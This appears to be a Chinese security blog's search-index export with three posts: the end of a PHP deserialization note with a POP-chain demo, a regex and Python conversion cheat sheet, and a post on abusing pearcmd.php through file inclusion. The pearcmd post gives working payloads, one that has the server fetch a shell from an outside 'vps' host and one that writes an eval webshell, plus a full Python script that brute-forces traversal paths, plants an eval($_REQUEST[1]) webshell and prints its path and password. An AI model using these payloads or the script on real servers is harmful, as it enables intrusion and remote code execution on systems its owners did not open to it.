class="string">&quot;;s:4:&quot;</span>hack<span class="string">&quot;;&#125;&quot;</span>;&#125;hack</span><br><span class="line"></span><br><span class="line">计算 <span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:31:&quot;</span><span class="number">123456</span>的长度</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="php反序列化内存分析"><a href="#php反序列化内存分析" class="headerlink" title="php反序列化内存分析"></a>php反序列化内存分析</h1><p>分析一段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;aaaaaa&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="title function_ invoke__">print_r</span>(<span class="number">111</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo2</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span>  <span class="variable">$b</span>=<span class="string">&#x27;bbbbb&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="number">222</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="string">&#x27;ccccc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="number">333</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo4</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span> = <span class="string">&#x27;ddddd&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;d);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="number">444</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;flag=<span class="keyword">new</span> <span class="title class_">Demo2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;flag-&gt;b= <span class="keyword">new</span> <span class="title class_">Demo3</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;flag-&gt;b-&gt;c=<span class="keyword">new</span> <span class="title class_">Demo4</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这段代码打印的结果是</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ddddd</span><br><span class="line">=&gt;</span><br><span class="line">Demo4 Object</span><br><span class="line">=&gt;</span><br><span class="line">Demo3 Object=&gt;(....)</span><br><span class="line">=&gt;</span><br><span class="line">Demo2 Object=&gt;(....)</span><br><span class="line">111=&gt;222=&gt;333=&gt;444=&gt;111=&gt;222=&gt;333=&gt;444</span><br></pre></td></tr></table></figure>

<p>微观上</p>
<p><strong>$a&#x3D; new classs();</strong></p>
<p><strong>$a在内存中是在外层</strong></p>
<p>__destruct()从外层开始</p>
<p>__wakeup()从最内层开始</p>
<p>php unserialize没有__construct()</p>
<p><strong>__wakeup()最先执行且从内存的最内层开始</strong></p>
<p><strong>__destruct()从内存的最外层开始</strong></p>
<p>由此可知<strong>pop链子的走向是由内到外（地址上）</strong></p>
<p>小kips 可以用一个类中没有的变量来连接两个类</p>
<img src="/2023/03/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/webp.webp" class="" title="img">









<p>参考</p>
<p><a href="http://www.lmxspace.com/2018/11/07/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Phar/">重新认识反序列化-Phar (lmxspace.com)</a></p>
<p><a href="https://y4tacker.blog.csdn.net/article/details/113588692">https://y4tacker.blog.csdn.net/article/details/113588692</a></p>
<p><a href="https://www.freebuf.com/articles/web/263710.html">https://www.freebuf.com/articles/web/263710.html</a></p>
<p><a href="https://blog.csdn.net/xxy605/article/details/120101090">https://blog.csdn.net/xxy605/article/details/120101090</a></p>
]]></content>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>re匹配规则</title>
    <url>/2023/03/13/re%E5%8C%B9%E9%85%8D%E8%A7%84%E5%88%99/</url>
    <content><![CDATA[<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>匹配单个字符<br>字符	功能	位置<br>.	匹配任意1个字符（除了\n）	<br>[ ]	匹配[ ]中列举的字符	<br>\d	匹配数字，即0-9	可以写在字符集[…]中<br>\D	匹配⾮数字，即不是数字	可以写在字符集[…]中<br>\s	匹配空⽩，即空格，tab键	可以写在字符集[…]中<br>\S	匹配⾮空⽩字符	可以写在字符集[…]中<br>\w	匹配单词字符，即a-z、A-Z、0-9、_	可以写在字符集[…]中<br>\W	匹配⾮单词字符	可以写在字符集[…]中</p>
<h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>\cx</td>
<td>匹配由x指明的控制字符。例如，<code> \cM</code> 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td>
</tr>
<tr>
<td>\f</td>
<td>匹配一个换页符。等价于 <code>\x0c</code> 和 <code>\cL</code>。</td>
</tr>
<tr>
<td>\n</td>
<td>匹配一个换行符。等价于 <code>\x0a </code>和<code> \cJ</code>。</td>
</tr>
<tr>
<td>\r</td>
<td>匹配一个回车符。等价于 <code>\x0d</code> 和 <code>\cM</code>。</td>
</tr>
<tr>
<td>\s</td>
<td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 <code>[ \f\n\r\t\v]</code>。</td>
</tr>
<tr>
<td>\S</td>
<td>匹配任何非空白字符。等价于<code> [^ \f\n\r\t\v]</code>。</td>
</tr>
<tr>
<td>\t</td>
<td>匹配一个制表符。等价于<code> \x09</code> 和 <code>\cI</code>。</td>
</tr>
<tr>
<td>\v</td>
<td>匹配一个垂直制表符。等价于 <code>\x0b</code> 和 <code>\cK</code>。</td>
</tr>
</tbody></table>
<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a><strong>特殊字符</strong></h3><table>
<thead>
<tr>
<th>特别字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>$</td>
<td>匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用<code> \$</code>。</td>
</tr>
<tr>
<td>( )</td>
<td>标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 <code>\(</code> 和 <code>\)</code>。</td>
</tr>
<tr>
<td>*</td>
<td>匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 <code>\*</code>。</td>
</tr>
<tr>
<td>+</td>
<td>匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 <code>\+</code>。</td>
</tr>
<tr>
<td>.</td>
<td>匹配除换行符 \n之外的任何单字符。要匹配 .，请使用<code> \.</code>。</td>
</tr>
<tr>
<td>[</td>
<td>标记一个中括号表达式的开始。要匹配 [，请使用 <code>\[</code>。</td>
</tr>
<tr>
<td>?</td>
<td>匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用<code> \?</code>。</td>
</tr>
<tr>
<td>\</td>
<td>将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td>^</td>
<td>匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 <code>\^</code>。</td>
</tr>
<tr>
<td>{</td>
<td>标记限定符表达式的开始。要匹配 {，请使用<code> \&#123;</code>。</td>
</tr>
<tr>
<td>|</td>
<td>指明两项之间的一个选择。要匹配 |，请使用 <code>|</code>。</td>
</tr>
</tbody></table>
<h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a><strong>限定符</strong></h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td>+</td>
<td>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td>?</td>
<td>匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td>{n}</td>
<td>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td>{n,}</td>
<td>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td>{n,m}</td>
<td>m 和 n 均为非负整数，其中n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>反向引用</strong></p>
<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="正则表达式的限定符有："><a href="#正则表达式的限定符有：" class="headerlink" title="正则表达式的限定符有："></a>正则表达式的限定符有：</h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 <code>\n</code> 或<code> \r</code> 之后的位置匹配。</td>
</tr>
<tr>
<td>$</td>
<td>匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与<code>\n</code>或 <code>\r</code> 之前的位置匹配。</td>
</tr>
<tr>
<td>\b</td>
<td>匹配一个字边界，即字与空格间的位置。</td>
</tr>
<tr>
<td>\B</td>
<td>非字边界匹配。</td>
</tr>
</tbody></table>
<h4 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile 函数"></a>compile 函数</h4><p><a href="https://blog.csdn.net/weixin_42793426/article/details/88545939">(72条消息) 正则表达式re.compile()的使用_艾莉宝贝的博客-CSDN博客_re.compile()</a></p>
<p><strong>compile 函数用于编译正则表达式，生成一个 Pattern 对象</strong>，它的一般使用形式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.<span class="built_in">compile</span>(pattern[, flag])</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># 将正则表达式编译成 Pattern 对象 </span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在上面，我们已将一个正则表达式编译成 Pattern 对象，接下来，我们就可以利用 pattern 的一系列方法对文本进行匹配查找了。Pattern 对象的一些常用方法主要有：</p>
<p>match 方法<br>search 方法<br>findall 方法<br>finditer 方法<br>split 方法<br>sub 方法<br>subn 方法</p>
<p><strong>Python中要实现字符与ASCII码之间的相互转化可使用Python自带的函数：chr() 和 ord()</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>(x [,base ]) 将x转换为一个整数 可以<span class="number">16</span>进制转<span class="number">10</span>进制  <span class="built_in">int</span>(x,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">long(x [,base ]) 将x转换为一个长整数</span><br><span class="line"></span><br><span class="line"><span class="built_in">float</span>(x ) 将x转换到一个浮点数</span><br><span class="line"></span><br><span class="line"><span class="built_in">complex</span>(real [,imag ]) 创建一个复数</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>(x ) 将对象 x 转换为字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">repr</span>(x ) 将对象 x 转换为表达式字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">str</span> ) 用来计算在字符串中的有效Python表达式,并返回一个对象</span><br><span class="line"></span><br><span class="line"><span class="built_in">tuple</span>(s ) 将序列 s 转换为一个元组</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>(s ) 将序列 s 转换为一个列表</span><br><span class="line"></span><br><span class="line"><span class="built_in">chr</span>(x ) 将一个整数转换为一个字符</span><br><span class="line"></span><br><span class="line">unichr(x ) 将一个整数转换为Unicode字符</span><br><span class="line"></span><br><span class="line"><span class="built_in">ord</span>(x ) 将一个字符转换为它的整数值</span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span>(x ) 将一个整数转换为一个十六进制字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">oct</span>(x ) 将一个整数转换为一个八进制字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span>() 将一个整数转换二进制字符串</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>pearcmd的妙用</title>
    <url>/2023/07/25/pearcmd%E7%9A%84%E5%A6%99%E7%94%A8/</url>
    <content><![CDATA[<h1 id="0x00-利用条件"><a href="#0x00-利用条件" class="headerlink" title="0x00 利用条件"></a>0x00 利用条件</h1><p>(1）服务器上安装pear，也就是存在pearcmd.php。同时知道pearcmd.php的文件路径</p>
<p>(2）web环境下在php.ini中register_argc_argv设置为On</p>
<p>(3）存在文件包含，可以包含php文件并且没有open_basedir的限制</p>
<h1 id="0x01-真实环境"><a href="#0x01-真实环境" class="headerlink" title="0x01 真实环境"></a>0x01 真实环境</h1><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库</p>
<p>如何安装安装pear</p>
<p>PHP版本在7.3及以前，pecl&#x2F;pear是默认安装的</p>
<p>在7.4以后，需要我们在编译的时候指定–with-pear才会安装</p>
<p>网上说，在dokcer任意的版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php。（然而总会遇到特殊的情况，没有这个文件的存在）</p>
<p>当没有这个文件存在时，可以尝试使用yum install php-pear去安装。</p>
<p>安装成功以后，执行pear命令可以得到</p>
<p><strong>两种路径、</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/usr/local/lib/php/pearcmd&quot;,  &quot;/usr/share/pear/pearcmd&quot;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h1><h2 id="1出网"><a href="#1出网" class="headerlink" title="1出网"></a>1出网</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php</span><br></pre></td></tr></table></figure>



<h2 id="2不出网"><a href="#2不出网" class="headerlink" title="2不出网"></a>2不出网</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure>



<h1 id="0x03不出网脚本"><a href="#0x03不出网脚本" class="headerlink" title="0x03不出网脚本"></a>0x03不出网脚本</h1><p>使用时开启burp劫包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;admire@&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auz=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">header1 = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line"><span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------添加变量区----------------------------</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">local_path=[<span class="string">&quot;/usr/local/lib/php/pearcmd&quot;</span>,<span class="string">&quot;/usr/share/pear/pearcmd&quot;</span>]  <span class="comment">#pear路径 可以自己添加</span></span><br><span class="line">download_path=<span class="string">&quot;/tmp&quot;</span> <span class="comment">#下载路径</span></span><br><span class="line">include_file=<span class="string">&quot;index.php&quot;</span><span class="comment">#含有文件包含漏洞的文件</span></span><br><span class="line">include_parms=<span class="string">&quot;file&quot;</span> <span class="comment">#参数</span></span><br><span class="line">proxy=<span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line"><span class="comment">#-------------添加变量区----------------------------</span></span><br><span class="line">s1=<span class="string">&quot;/..&quot;</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> local_path:</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        <span class="keyword">if</span> auz==<span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">f&quot;/<span class="subst">&#123;include_file&#125;</span>?+config-create+/&amp;<span class="subst">&#123;include_parms&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>[<span class="number">1</span>:]&#125;</span><span class="subst">&#123;s&#125;</span>&amp;/&lt;?php%20phpinfo();?&gt;+<span class="subst">&#123;download_path&#125;</span>/eval.php&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        url1=url+(payload)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)<span class="comment">#自己可以改</span></span><br><span class="line"></span><br><span class="line">        re=requests.get(url=url1,headers=header1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Successfully created&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="comment">#print(checking)</span></span><br><span class="line">            <span class="comment">#burp抓包后修改url编码后的数据</span></span><br><span class="line">            os.environ[<span class="string">&quot;http_proxy&quot;</span>] = proxy</span><br><span class="line">            os.environ[<span class="string">&quot;https_proxy&quot;</span>] = proxy</span><br><span class="line">            exp=<span class="string">f&quot;/<span class="subst">&#123;include_file&#125;</span>?+config-create+/&amp;<span class="subst">&#123;include_parms&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>[<span class="number">1</span>:]&#125;</span><span class="subst">&#123;s&#125;</span>&amp;/&lt;?=eval($_REQUEST[1]);?&gt;+<span class="subst">&#123;download_path&#125;</span>/dada.php&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(url+exp)</span><br><span class="line">            rce=requests.get(url=url+exp,headers=header1)</span><br><span class="line">            path=<span class="string">f&quot;/<span class="subst">&#123;include_file&#125;</span>?<span class="subst">&#123;include_parms&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>[<span class="number">1</span>:]&#125;</span><span class="subst">&#123;download_path&#125;</span>/dada&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;木马路径&quot;</span>+url+path)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;password: 1&quot;</span>)</span><br><span class="line">            auz=<span class="literal">True</span> <span class="comment">#注释掉会一直跑下去。直到遍历结束</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:<span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">str</span> += s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;现实告诉我必须burp发包才可以写马！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>























]]></content>
  </entry>
</search>
